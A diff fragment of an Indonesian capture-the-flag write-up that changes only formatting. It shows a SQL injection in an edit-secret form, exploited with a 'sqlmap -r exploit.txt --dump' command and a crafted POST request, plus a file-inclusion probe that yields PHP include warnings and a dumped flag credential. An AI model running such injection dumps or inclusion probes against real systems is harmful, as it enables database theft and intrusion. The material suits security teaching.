@@ -18,7 +18,7 @@ UPDATE `secret` SET `judul` = 'a'', `secret` = 'a' WHERE `id` = '1431944397'You 
 command :<br/>
 ``sqlmap -r exploit.txt --dump``
 <br/>
-dengan isi file exploit.txt sebagai berikut :
+dengan isi file exploit.txt sebagai berikut :<br/><br/>
 ```
 POST /page.php?f=editsecret&id=<your-id> HTTP/1.1
 Host: 103.171.85.90:8082
@@ -44,7 +44,6 @@ didapatkan user dengan username **first-flag-is** dan password **KKST2021{do_you
 **/page.php?f=randomstring**
 didapatkan error sebagai berikut :
 ```
-  
 **Warning**: include(randomstring.php): failed to open stream: No such file or directory in **/var/www/html/page.php** on line **15**  
   
 **Warning**: include(): Failed opening 'randomstring.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/page.php** on line **15**
